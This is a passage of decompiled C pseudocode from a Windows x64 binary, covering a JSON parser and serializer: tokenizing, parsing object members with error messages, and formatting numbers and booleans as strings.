    *(__int64 **)(*(_QWORD *)(*(_QWORD *)(v4 + 8) + 8 * (((unsigned __int64)v3[2] >> 1) & (*(_QWORD *)(v4 + 16) - 1i64)))
                + 8 * ((unsigned __int64)v3[2] & 1)),
    (__int64 *)&v29);
  while ( sub_140071DB0(v1, (__int64)v37) )
  {
    v5 = 1;
    v6 = (int)v37[0];
    if ( LODWORD(v37[0]) == 12 )
    {
      while ( v5 )
      {
        v5 = sub_140071DB0(v1, (__int64)v37);
        v6 = (int)v37[0];
        if ( LODWORD(v37[0]) != 12 )
        {
          if ( !v5 )
            goto LABEL_56;
          goto LABEL_10;
        }
      }
      break;
    }
LABEL_10:
    if ( v6 == 2 && !v41 )
      goto LABEL_36;
    sub_140004F20(&v40, byte_1400A3400, 0i64);
    if ( v6 != 5 )
      break;
    v7 = sub_1400701E0(v1, v37, &v40);
    v8 = v1;
    if ( !v7 )
      goto LABEL_55;
    if ( !sub_140071DB0(v1, (__int64)&v26) || (_DWORD)v26 != 11 )
    {
      v36 = 15i64;
      v35 = 0i64;
      LOBYTE(v34[0]) = 0;
      sub_140004F20(v34, "Missing ':' after object member name", 0x24ui64);
      Dst = (void *)15;
      LOBYTE(Dst) = 0;
      v30 = v26;
      v31 = v27;
      sub_140004DF0(&Dst, v34, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v33 = 0i64;
      sub_140071150((_QWORD *)(v1 + 40), (__int64)&v30);
      if ( (unsigned __int64)Dst >= 0x10 )
        operator delete(Dst);
      Dst = (void *)15;
      v31 = 0i64;
      LOBYTE(Dst) = 0;
      v23 = *(_QWORD *)(v1 + 72);
      do
      {
        if ( !sub_140071DB0(v1, (__int64)&v26) )
          sub_140072400((_QWORD *)(v1 + 40), (signed int)v23);
      }
      while ( (_DWORD)v26 != 2 && (_DWORD)v26 );
      sub_140072400((_QWORD *)(v1 + 40), (signed int)v23);
      v21 = 0;
      if ( v36 >= 0x10 )
        operator delete(v34[0]);
      goto LABEL_66;
    }
    v9 = std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::back(v1);
    v10 = sub_14006C0C0(v9, &v40);
    v11 = *(_QWORD *)(v1 + 32);
    if ( !(((_BYTE)v11 + *(_BYTE *)(v1 + 24)) & 1) && *(_QWORD *)(v1 + 16) <= (unsigned __int64)(v11 + 2) >> 1 )
      sub_140069110((_QWORD *)v1, 1ui64);
    v12 = *(_QWORD *)(v1 + 16);
    *(_QWORD *)(v1 + 24) &= 2 * v12 - 1;
    v13 = *(_QWORD *)(v1 + 32) + *(_QWORD *)(v1 + 24);
    v14 = 8 * ((v12 - 1) & (v13 >> 1));
    if ( !*(_QWORD *)(v14 + *(_QWORD *)(v1 + 8)) )
    {
      v15 = operator new(0x10ui64);
      if ( !v15 )
      {
        std::_Xbad_alloc();
        __debugbreak();
LABEL_36:
        v21 = 1;
        goto LABEL_66;
      }
      *(_QWORD *)(v14 + *(_QWORD *)(v1 + 8)) = v15;
    }
    v16 = (signed __int64 *)(*(_QWORD *)(v14 + *(_QWORD *)(v1 + 8)) + 8 * (v13 & 1));
    if ( v16 )
      *v16 = v10;
    ++*(_QWORD *)(v1 + 32);
    v17 = sub_1400720D0(v1);
    v18 = (*(_QWORD *)(v1 + 32))-- == 1i64;
    if ( v18 )
      *(_QWORD *)(v1 + 24) = 0i64;
    v8 = v1;
    if ( !v17 )
    {
LABEL_55:
      v21 = sub_140072390(v8, 2);
      goto LABEL_66;
    }
    if ( !sub_140071DB0(v1, (__int64)v34)
      || (v19 = (int)v34[0], (LODWORD(v34[0]) - 2) & 0xFFFFFFF5)
      || LODWORD(v34[0]) == 4 )
    {
      v39 = 15i64;
      v38 = 0i64;
      LOBYTE(v37[0]) = 0;
      sub_140004F20(v37, "Missing ',' or '}' in object declaration", 0x28ui64);
      Dst = (void *)15;
      LOBYTE(Dst) = 0;
      v30 = *(_OWORD *)v34;
      v31 = v35;
      sub_140004DF0(&Dst, v37, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v33 = 0i64;
      sub_140071150((_QWORD *)(v1 + 40), (__int64)&v30);
      if ( (unsigned __int64)Dst >= 0x10 )
        operator delete(Dst);
      Dst = (void *)15;
      v31 = 0i64;
      LOBYTE(Dst) = 0;
      v22 = *(_QWORD *)(v1 + 72);
      do
      {
        if ( !sub_140071DB0(v1, (__int64)&v26) )
          sub_140072400((_QWORD *)(v1 + 40), (signed int)v22);
      }
      while ( (_DWORD)v26 != 2 && (_DWORD)v26 );
      sub_140072400((_QWORD *)(v1 + 40), (signed int)v22);
      v21 = 0;
      if ( v39 >= 0x10 )
        operator delete(v37[0]);
      goto LABEL_66;
    }
    for ( i = 1; LODWORD(v34[0]) == 12; v19 = (int)v34[0] )
    {
      if ( !i )
        break;
      i = sub_140071DB0(v1, (__int64)v34);
    }
    if ( v19 == 2 )
      goto LABEL_36;
  }
LABEL_56:
  v36 = 15i64;
  v35 = 0i64;
  LOBYTE(v34[0]) = 0;
  sub_140004F20(v34, "Missing '}' or object member name", 0x21ui64);
  Dst = (void *)15;
  LOBYTE(Dst) = 0;
  v30 = *(_OWORD *)v37;
  v31 = v38;
  sub_140004DF0(&Dst, v34, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v33 = 0i64;
  sub_140071150((_QWORD *)(v1 + 40), (__int64)&v30);
  if ( (unsigned __int64)Dst >= 0x10 )
    operator delete(Dst);
  Dst = (void *)15;
  v31 = 0i64;
  LOBYTE(Dst) = 0;
  v24 = *(_QWORD *)(v1 + 72);
  do
  {
    if ( !sub_140071DB0(v1, (__int64)&v26) )
      sub_140072400((_QWORD *)(v1 + 40), (signed int)v24);
  }
  while ( (_DWORD)v26 != 2 && (_DWORD)v26 );
  sub_140072400((_QWORD *)(v1 + 40), (signed int)v24);
  v21 = 0;
  if ( v36 >= 0x10 )
    operator delete(v34[0]);
  v36 = 15i64;
  v35 = 0i64;
  LOBYTE(v34[0]) = 0;
LABEL_66:
  sub_14006BF10((__int64)&v29);
  if ( v42 >= 0x10 )
    operator delete(v40);
  return v21;
}
// 14006FB90: using guessed type __int64 __fastcall std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::back(_QWORD);
// 1400701E0: using guessed type __int64 __fastcall sub_1400701E0(_QWORD, _QWORD, _QWORD);
// 1400720D0: using guessed type __int64 __fastcall sub_1400720D0(_QWORD);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140071D60) ----------------------------------------------------
bool __fastcall sub_140071D60(__int64 a1)
{
  char *v1; // rax
  char *v2; // r8
  char i; // dl
  signed __int64 v4; // rax
  bool v5; // zf

  v1 = *(char **)(a1 + 128);
  v2 = *(char **)(a1 + 120);
  for ( i = 0; v1 != v2; v1 = *(char **)(a1 + 128) )
  {
    i = *v1;
    v4 = (signed __int64)(v1 + 1);
    *(_QWORD *)(a1 + 128) = v4;
    if ( i == 92 )
    {
      if ( (char *)v4 != v2 )
        *(_QWORD *)(a1 + 128) = v4 + 1;
    }
    else
    {
      v5 = i == 34;
      if ( i == 34 )
        return v5;
    }
  }
  return i == 34;
}

//----- (0000000140071DB0) ----------------------------------------------------
char __fastcall sub_140071DB0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  unsigned __int8 *v3; // rdx
  __int64 v4; // rbx
  signed __int64 v5; // r8
  unsigned __int8 *v6; // rcx
  unsigned __int64 v7; // rax
  char *v8; // rax
  char v9; // cl
  char v10; // al
  __int64 v12; // r8
  signed __int64 v13; // rdx
  __int64 v14; // r8
  signed __int64 v15; // rdx
  __int64 v16; // r8
  signed __int64 v17; // rdx

  v2 = a2;
  v3 = *(unsigned __int8 **)(a1 + 120);
  v4 = a1;
  if ( *(unsigned __int8 **)(a1 + 128) != v3 )
  {
    v5 = 4294977024i64;
    do
    {
      v6 = *(unsigned __int8 **)(v4 + 128);
      v7 = *v6;
      if ( (unsigned __int8)v7 > 0x20u )
        break;
      if ( !_bittest64(&v5, v7) )
        break;
      *(_QWORD *)(v4 + 128) = v6 + 1;
    }
    while ( v6 + 1 != v3 );
  }
  *(_QWORD *)(v2 + 8) = *(_QWORD *)(v4 + 128);
  v8 = *(char **)(v4 + 128);
  if ( v8 == *(char **)(v4 + 120) )
  {
    v9 = 0;
  }
  else
  {
    v9 = *v8;
    *(_QWORD *)(v4 + 128) = v8 + 1;
  }
  switch ( v9 )
  {
    case 0:
      *(_DWORD *)v2 = 0;
      goto LABEL_18;
    case 34:
      *(_DWORD *)v2 = 5;
      v10 = sub_140071D60(v4);
      goto LABEL_16;
    case 44:
      *(_DWORD *)v2 = 10;
      goto LABEL_18;
    case 45:
    case 48:
    case 49:
    case 50:
    case 51:
    case 52:
    case 53:
    case 54:
    case 55:
    case 56:
    case 57:
      *(_DWORD *)v2 = 6;
      sub_1400716E0(v4);
      goto LABEL_18;
    case 47:
      *(_DWORD *)v2 = 12;
      v10 = sub_140071590(v4);
LABEL_16:
      if ( !v10 )
        goto LABEL_17;
      goto LABEL_18;
    case 58:
      *(_DWORD *)v2 = 11;
      goto LABEL_18;
    case 91:
      *(_DWORD *)v2 = 3;
      goto LABEL_18;
    case 93:
      *(_DWORD *)v2 = 4;
      goto LABEL_18;
    case 102:
      *(_DWORD *)v2 = 8;
      v14 = *(_QWORD *)(v4 + 128);
      if ( *(_QWORD *)(v4 + 120) - v14 < 4 )
        goto LABEL_17;
      v15 = 4i64;
      while ( 1 )
      {
        --v15;
        if ( aAlse[v15 + 4 + v14 - (_QWORD)""] != aAlse[v15] )
          goto LABEL_17;
        if ( !v15 )
        {
          *(_QWORD *)(v4 + 128) = v14 + 4;
          goto LABEL_18;
        }
      }
    case 110:
      *(_DWORD *)v2 = 9;
      v16 = *(_QWORD *)(v4 + 128);
      if ( *(_QWORD *)(v4 + 120) - v16 < 3 )
        goto LABEL_17;
      v17 = 3i64;
      while ( 1 )
      {
        --v17;
        if ( aUll[v17 + 3 + v16 - (_QWORD)""] != aUll[v17] )
          goto LABEL_17;
        if ( !v17 )
        {
          *(_QWORD *)(v4 + 128) = v16 + 3;
          goto LABEL_18;
        }
      }
    case 116:
      *(_DWORD *)v2 = 7;
      v12 = *(_QWORD *)(v4 + 128);
      if ( *(_QWORD *)(v4 + 120) - v12 < 3 )
        goto LABEL_17;
      v13 = 3i64;
      break;
    case 123:
      *(_DWORD *)v2 = 1;
      goto LABEL_18;
    case 125:
      *(_DWORD *)v2 = 2;
      goto LABEL_18;
    default:
      goto LABEL_17;
  }
  do
  {
    --v13;
    if ( aRue[v13 + 3 + v12 - (_QWORD)""] != aRue[v13] )
    {
LABEL_17:
      *(_DWORD *)v2 = 13;
      goto LABEL_18;
    }
  }
  while ( v13 );
  *(_QWORD *)(v4 + 128) = v12 + 3;
LABEL_18:
  *(_QWORD *)(v2 + 16) = *(_QWORD *)(v4 + 128);
  return 1;
}

//----- (0000000140072390) ----------------------------------------------------
char __fastcall sub_140072390(__int64 a1, int a2)
{
  unsigned __int64 v2; // rdi
  int v3; // esi
  __int64 v4; // rbx
  int v6; // [rsp+20h] [rbp-28h]

  v2 = *(signed int *)(a1 + 72);
  v3 = a2;
  v4 = a1;
  do
  {
    if ( !sub_140071DB0(v4, (__int64)&v6) )
      sub_140072400((_QWORD *)(v4 + 40), v2);
  }
  while ( v6 != v3 && v6 );
  sub_140072400((_QWORD *)(v4 + 40), v2);
  return 0;
}

//----- (0000000140072400) ----------------------------------------------------
void __fastcall sub_140072400(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  _QWORD *i; // rbx
  __int64 v4; // rdi
  bool v5; // zf

  v2 = a2;
  for ( i = a1; i[4] < v2; sub_14006F360(i) )
    ;
  while ( v2 < i[4] )
  {
    v4 = *(_QWORD *)(i[1] + 8 * ((i[2] - 1i64) & (i[4] + i[3] - 1i64)));
    if ( *(_QWORD *)(v4 + 48) >= 0x10ui64 )
      operator delete(*(void **)(v4 + 24));
    *(_QWORD *)(v4 + 48) = 15i64;
    *(_QWORD *)(v4 + 40) = 0i64;
    *(_BYTE *)(v4 + 24) = 0;
    v5 = i[4]-- == 1i64;
    if ( v5 )
      i[3] = 0i64;
  }
}

//----- (00000001400724B0) ----------------------------------------------------
char __fastcall sub_1400724B0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  signed __int64 v4; // rbp
  unsigned __int8 *v5; // rdx
  unsigned __int8 *v6; // rcx
  unsigned __int64 v7; // rax
  char *v8; // rax
  char v9; // cl
  char v10; // al
  bool v11; // zf
  __int64 v12; // rax
  __int64 v13; // r9
  signed __int64 v14; // rdx
  __int64 v15; // r9
  signed __int64 v16; // rdx
  __int64 v17; // r9
  signed __int64 v18; // rdx

  v2 = a2;
  v3 = a1;
  if ( *(_BYTE *)(a1 + 184) )
  {
    v4 = 4294977024i64;
    do
    {
      v5 = *(unsigned __int8 **)(v3 + 120);
      if ( *(unsigned __int8 **)(v3 + 128) != v5 )
      {
        do
        {
          v6 = *(unsigned __int8 **)(v3 + 128);
          v7 = *v6;
          if ( (unsigned __int8)v7 > 0x20u )
            break;
          if ( !_bittest64(&v4, v7) )
            break;
          *(_QWORD *)(v3 + 128) = v6 + 1;
        }
        while ( v6 + 1 != v5 );
      }
      *(_QWORD *)(v2 + 8) = *(_QWORD *)(v3 + 128);
      v8 = *(char **)(v3 + 128);
      if ( v8 == *(char **)(v3 + 120) )
      {
        v9 = 0;
      }
      else
      {
        v9 = *v8;
        *(_QWORD *)(v3 + 128) = v8 + 1;
      }
      switch ( v9 )
      {
        case 0:
          *(_DWORD *)v2 = 0;
          goto LABEL_19;
        case 34:
          *(_DWORD *)v2 = 5;
          v10 = sub_140071D60(v3);
          goto LABEL_17;
        case 44:
          *(_DWORD *)v2 = 10;
          goto LABEL_19;
        case 45:
        case 48:
        case 49:
        case 50:
        case 51:
        case 52:
        case 53:
        case 54:
        case 55:
        case 56:
        case 57:
          *(_DWORD *)v2 = 6;
          sub_1400716E0(v3);
          goto LABEL_19;
        case 47:
          *(_DWORD *)v2 = 12;
          v10 = sub_140071590(v3);
LABEL_17:
          if ( !v10 )
            goto LABEL_18;
          goto LABEL_19;
        case 58:
          *(_DWORD *)v2 = 11;
          goto LABEL_19;
        case 91:
          *(_DWORD *)v2 = 3;
          goto LABEL_19;
        case 93:
          *(_DWORD *)v2 = 4;
          goto LABEL_19;
        case 102:
          *(_DWORD *)v2 = 8;
          v15 = *(_QWORD *)(v3 + 128);
          if ( *(_QWORD *)(v3 + 120) - v15 < 4 )
            goto LABEL_18;
          v16 = 4i64;
          while ( 1 )
          {
            --v16;
            if ( aAlse[v16 + 4 + v15 - (_QWORD)""] != aAlse[v16] )
              goto LABEL_18;
            if ( !v16 )
            {
              *(_QWORD *)(v3 + 128) = v15 + 4;
              goto LABEL_19;
            }
          }
        case 110:
          *(_DWORD *)v2 = 9;
          v17 = *(_QWORD *)(v3 + 128);
          if ( *(_QWORD *)(v3 + 120) - v17 < 3 )
            goto LABEL_18;
          v18 = 3i64;
          while ( 1 )
          {
            --v18;
            if ( aUll[v18 + 3 + v17 - (_QWORD)""] != aUll[v18] )
              goto LABEL_18;
            if ( !v18 )
            {
              *(_QWORD *)(v3 + 128) = v17 + 3;
              goto LABEL_19;
            }
          }
        case 116:
          *(_DWORD *)v2 = 7;
          v13 = *(_QWORD *)(v3 + 128);
          if ( *(_QWORD *)(v3 + 120) - v13 < 3 )
            goto LABEL_18;
          v14 = 3i64;
          break;
        case 123:
          *(_DWORD *)v2 = 1;
          goto LABEL_19;
        case 125:
          *(_DWORD *)v2 = 2;
          goto LABEL_19;
        default:
          goto LABEL_18;
      }
      do
      {
        --v14;
        if ( aRue[v14 + 3 + v13 - (_QWORD)""] != aRue[v14] )
        {
LABEL_18:
          *(_DWORD *)v2 = 13;
          goto LABEL_19;
        }
      }
      while ( v14 );
      *(_QWORD *)(v3 + 128) = v13 + 3;
LABEL_19:
      v11 = *(_DWORD *)v2 == 12;
      v12 = *(_QWORD *)(v3 + 128);
      *(_QWORD *)(v2 + 16) = v12;
    }
    while ( v11 );
  }
  else
  {
    LOBYTE(v12) = sub_140071DB0(a1, a2);
  }
  return v12;
}

//----- (0000000140072820) ----------------------------------------------------
__int64 __fastcall sub_140072820(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &off_1400A2B70;
  *(_QWORD *)(a1 + 32) = 15i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_BYTE *)(a1 + 8) = 0;
  result = a1;
  *(_BYTE *)(a1 + 40) = 0;
  return result;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (0000000140072850) ----------------------------------------------------
__int64 __fastcall sub_140072850(__int64 a1)
{
  *(_DWORD *)(a1 + 24) &= 0xFFFFF9FF;
  *(_DWORD *)(a1 + 24) |= 0x800u;
  return a1;
}

//----- (0000000140072870) ----------------------------------------------------
__int64 __fastcall sub_140072870(__int64 a1)
{
  *(_DWORD *)(a1 + 24) |= 4u;
  return a1;
}

//----- (0000000140072EB0) ----------------------------------------------------
void *__fastcall sub_140072EB0(void *a1, double a2)
{
  void *v2; // rbx

  v2 = a1;
  sub_140072EE0(a1, a2, 0, 0x11u);
  return v2;
}

//----- (0000000140072EE0) ----------------------------------------------------
_QWORD *__fastcall sub_140072EE0(void *Dst, double a2, char a3, unsigned int a4)
{
  _QWORD *v4; // rdi
  char v5; // si
  size_t v6; // rbx
  int v7; // eax
  const char *v8; // rax
  const char *v9; // r8
  char *v10; // rdx
  unsigned __int64 v11; // r8
  double v13; // [rsp+20h] [rbp-78h]
  int v14; // [rsp+28h] [rbp-70h]
  char DstBuf[32]; // [rsp+30h] [rbp-68h]
  char Dest; // [rsp+50h] [rbp-48h]

  v4 = Dst;
  v5 = a3;
  v6 = 0i64;
  v14 = 0;
  sprintf(&Dest, "%%.%dg", a4);
  v13 = a2;
  if ( (signed __int16)dtest(&v13) > 0 )
  {
    if ( a2 >= 0.0 )
    {
      v8 = "Infinity";
      v9 = "1e+9999";
    }
    else
    {
      v8 = "-Infinity";
      v9 = "-1e+9999";
    }
    if ( v5 )
      v9 = v8;
    v7 = sprintf_s(DstBuf, 0x20ui64, v9);
  }
  else
  {
    v7 = sprintf_s(DstBuf, 0x20ui64, &Dest, a2);
  }
  v10 = DstBuf;
  v11 = v7;
  if ( DstBuf > &DstBuf[v7] )
    v11 = 0i64;
  if ( v11 )
  {
    do
    {
      if ( *v10 == 44 )
        *v10 = 46;
      ++v10;
    }
    while ( v10 - DstBuf < v11 );
  }
  v4[3] = 15i64;
  v4[2] = 0i64;
  *(_BYTE *)v4 = 0;
  if ( DstBuf[0] )
  {
    v6 = -1i64;
    do
      ++v6;
    while ( DstBuf[v6] );
  }
  sub_140004F20(v4, DstBuf, v6);
  return v4;
}
// 1400A1880: using guessed type __int64 __fastcall dtest(_QWORD);
// 140072EE0: using guessed type char DstBuf[32];

//----- (0000000140073060) ----------------------------------------------------
_QWORD *__fastcall sub_140073060(void *Dst, signed __int64 a2)
{
  size_t v2; // r10
  _QWORD *v3; // rbx
  unsigned __int64 v4; // r9
  char *v5; // rcx
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // r8
  char v12; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = Dst;
  v4 = a2;
  v5 = &v12;
  v12 = 0;
  if ( a2 == 0x8000000000000000i64 )
  {
    v6 = 0x8000000000000000i64;
    do
    {
      --v5;
      v7 = (unsigned __int64)(v6 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
      *v5 = v6 - 10 * v7 + 48;
      v6 = (unsigned __int64)(v6 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
    }
    while ( v7 );
    *--v5 = 45;
  }
  else if ( a2 >= 0 )
  {
    do
    {
      --v5;
      v10 = (unsigned __int64)(v4 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
      *v5 = v4 - 10 * v10 + 48;
      v4 = (unsigned __int64)(v4 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
    }
    while ( v10 );
  }
  else
  {
    v8 = -a2;
    do
    {
      --v5;
      v9 = (unsigned __int64)(v8 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
      *v5 = v8 - 10 * v9 + 48;
      v8 = (unsigned __int64)(v8 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
    }
    while ( v9 );
    *--v5 = 45;
  }
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (00000001400731B0) ----------------------------------------------------
void *__fastcall sub_1400731B0(void *Dst, unsigned __int64 a2)
{
  size_t v2; // r8
  unsigned __int64 v3; // r9
  void *v4; // rbx
  char *v5; // r10
  unsigned __int64 v6; // rdx
  char v8; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = Dst;
  v5 = &v8;
  v8 = 0;
  do
  {
    --v5;
    v6 = (unsigned __int64)(v3 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
    *v5 = v3 - 10 * v6 + 48;
    v3 = (unsigned __int64)(v3 * (unsigned __int128)0xCCCCCCCCCCCCCCCDui64 >> 64) >> 3;
  }
  while ( v6 );
  *((_QWORD *)Dst + 3) = 15i64;
  *((_QWORD *)Dst + 2) = 0i64;
  *(_BYTE *)Dst = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(Dst, v5, v2);
  return v4;
}

//----- (0000000140073260) ----------------------------------------------------
void *__fastcall sub_140073260(void *Dst, char a2)
{
  size_t v2; // r8
  void *v3; // rbx
  char *v4; // rax

  v2 = 0i64;
  v3 = Dst;
  *((_QWORD *)Dst + 3) = 15i64;
  *((_QWORD *)Dst + 2) = 0i64;
  v4 = "false";
  *(_BYTE *)Dst = 0;
  if ( a2 )
    v4 = "true";
  if ( *v4 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v4[v2] );
  }
  sub_140004F20(Dst, v4, v2);
  return v3;
}

//----- (00000001400732C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400732C0(__int64 a1, _QWORD *a2, char *a3)
{
  _QWORD *v3; // r14
  char *v4; // rdi
  __int64 v5; // rbx

  v3 = a2;
  v4 = a3;
  v5 = a1;
  sub_140004F20((void *)(a1 + 8), byte_1400A3400, 0i64);
  sub_140073360(v5, v4);
  sub_140004CA0((void *)(v5 + 8), "\n", 1ui64);
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  sub_140004DF0(v3, (_QWORD *)(v5 + 8), 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v3;
}

//----- (0000000140073360) ----------------------------------------------------
void __fastcall sub_140073360(__int64 a1, char *a2)
{
  char *v2; // rsi
  __int64 v3; // rbx
  signed __int64 v4; // rax
  _QWORD *v5; // rax
  void **v6; // rcx
  unsigned __int64 v7; // rax
  _QWORD *v8; // rax
  double v9; // xmm0_8
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  char v12; // al
  _QWORD *v13; // rax
  _QWORD *v14; // rbx
  size_t v15; // r8
  unsigned __int64 v16; // rdi
  unsigned __int64 v17; // rax
  _BYTE *v18; // rax
  _BYTE *v19; // rax
  _QWORD *v20; // rax
  signed int v21; // esi
  size_t v22; // r8
  unsigned __int64 v23; // rdi
  unsigned __int64 v24; // rax
  _BYTE *v25; // rax
  _QWORD *v26; // rax
  _QWORD *v27; // rax
  __int64 v28; // rax
  size_t v29; // r8
  unsigned __int64 v30; // rdi
  unsigned __int64 v31; // rax
  _QWORD *v32; // rax
  _QWORD *v33; // rsi
  size_t v34; // r8
  signed __int64 v35; // rcx
  unsigned __int64 v36; // rbx
  unsigned __int64 v37; // rax
  _BYTE *v38; // rax
  _QWORD *v39; // rax
  _QWORD *v40; // rax
  void **v41; // rdi
  void **v42; // rbx
  size_t v43; // r8
  unsigned __int64 v44; // rdi
  unsigned __int64 v45; // rax
  _BYTE *v46; // rax
  _QWORD *v47; // rax
  _QWORD *v48; // rax
  void *v49; // rdx
  __int64 v50; // r8
  _QWORD *v51; // rax
  char *v52; // rdx
  size_t v53; // r8
  __int64 v54; // rax
  size_t v55; // r8
  unsigned __int64 v56; // rbx
  unsigned __int64 v57; // rax
  _BYTE *v58; // rax
  void **v59; // rdi
  _QWORD *v60; // rax
  void **v61; // rbx
  __int64 v62; // [rsp+20h] [rbp-E0h]
  char *v63; // [rsp+28h] [rbp-D8h]
  int v64; // [rsp+30h] [rbp-D0h]
  void *v65; // [rsp+38h] [rbp-C8h]
  void **v66; // [rsp+40h] [rbp-C0h]
  __int64 v67; // [rsp+50h] [rbp-B0h]
  void *v68; // [rsp+58h] [rbp-A8h]
  __int64 v69; // [rsp+68h] [rbp-98h]
  unsigned __int64 v70; // [rsp+70h] [rbp-90h]
  void **v71; // [rsp+78h] [rbp-88h]
  unsigned __int64 v72; // [rsp+90h] [rbp-70h]
  void **v73; // [rsp+98h] [rbp-68h]
  unsigned __int64 v74; // [rsp+B0h] [rbp-50h]
  void **Dst; // [rsp+B8h] [rbp-48h]
  unsigned __int64 v76; // [rsp+D0h] [rbp-30h]
  void **v77; // [rsp+D8h] [rbp-28h]
  unsigned __int64 v78; // [rsp+F0h] [rbp-10h]
  void **v79; // [rsp+F8h] [rbp-8h]
  unsigned __int64 v80; // [rsp+110h] [rbp+10h]

  v67 = -2i64;
  v2 = a2;
  v63 = a2;
  v3 = a1;
  v62 = a1;
  switch ( (unsigned int)DName::status(a2) )
  {
    case 0u:
      sub_140004CA0((void *)(v3 + 8), "null", 4ui64);
      return;
    case 1u:
      v4 = sub_14006D2D0(v2);
      v5 = sub_140073060(&v73, v4);
      sub_140004B80((_QWORD *)(v3 + 8), v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v74 >= 0x10 )
      {
        v6 = v73;
        goto LABEL_150;
      }
      return;
    case 2u:
      v7 = sub_14006D2E0(v2);
      v8 = sub_1400731B0(&v77, v7);
      sub_140004B80((_QWORD *)(v3 + 8), v8, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v78 >= 0x10 )
      {
        v6 = v77;
        goto LABEL_150;
      }
      return;
    case 3u:
      v9 = sub_14006CED0(v2);
      v10 = sub_140072EB0(&v71, v9);
      sub_140004B80((_QWORD *)(v3 + 8), v10, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v72 >= 0x10 )
      {
        v6 = v71;
        goto LABEL_150;
      }
      return;
    case 4u:
      if ( sub_14006E7C0((__int64)v2, (unsigned int **)&v62, &v63) )
      {
        v11 = (_QWORD *)sub_140072880(&Dst);
        sub_140004B80((_QWORD *)(v3 + 8), v11, 0i64, 0xFFFFFFFFFFFFFFFFui64);
        if ( v76 >= 0x10 )
        {
          v6 = Dst;
          goto LABEL_150;
        }
      }
      return;
    case 5u:
      v12 = sub_14006CD90(v2);
      v13 = sub_140073260(&v79, v12);
      sub_140004B80((_QWORD *)(v3 + 8), v13, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v80 >= 0x10 )
      {
        v6 = v79;
        goto LABEL_150;
      }
      return;
    case 6u:
      v14 = (_QWORD *)(v3 + 8);
      v15 = v14[2];
      if ( -1i64 - v15 <= 1 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v16 = v15 + 1;
      if ( v15 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v17 = v14[3];
      if ( v17 < v16 )
      {
        sub_140004790(v14, v16, v15);
        if ( !v16 )
          goto LABEL_33;
        goto LABEL_26;
      }
      if ( v16 )
      {
LABEL_26:
        if ( v14[3] < 0x10ui64 )
          v19 = v14;
        else
          v19 = (_BYTE *)*v14;
        v19[v14[2]] = 91;
        v14[2] = v16;
        if ( v14[3] < 0x10ui64 )
          v20 = v14;
        else
          v20 = (_QWORD *)*v14;
        *((_BYTE *)v20 + v16) = 0;
        goto LABEL_33;
      }
      v14[2] = 0i64;
      if ( v17 < 0x10 )
        v18 = v14;
      else
        v18 = (_BYTE *)*v14;
      *v18 = 0;
LABEL_33:
      v64 = sub_14006F110(v2);
      v21 = 0;
      if ( v64 <= 0 )
        goto LABEL_56;
      while ( 2 )
      {
        if ( v21 <= 0 )
          goto LABEL_52;
        v22 = v14[2];
        if ( -1i64 - v22 <= 1 )
          goto LABEL_55;
        v23 = v22 + 1;
        if ( v22 + 1 <= 0xFFFFFFFFFFFFFFFEui64 )
        {
          v24 = v14[3];
          if ( v24 >= v23 )
          {
            if ( v22 == -1i64 )
            {
              v14[2] = 0i64;
              if ( v24 < 0x10 )
                v25 = v14;
              else
                v25 = (_BYTE *)*v14;
              *v25 = 0;
LABEL_52:
              v28 = sub_14006C520((_QWORD **)v63, v21);
              sub_140073360(v62, v28);
              if ( ++v21 >= v64 )
                goto LABEL_56;
              continue;
            }
          }
          else
          {
            sub_140004790(v14, v22 + 1, v22);
            if ( !v23 )
              goto LABEL_52;
          }
          if ( v14[3] < 0x10ui64 )
            v26 = v14;
          else
            v26 = (_QWORD *)*v14;
          *((_BYTE *)v26 + v14[2]) = 44;
          v14[2] = v23;
          if ( v14[3] < 0x10ui64 )
            v27 = v14;
          else
            v27 = (_QWORD *)*v14;
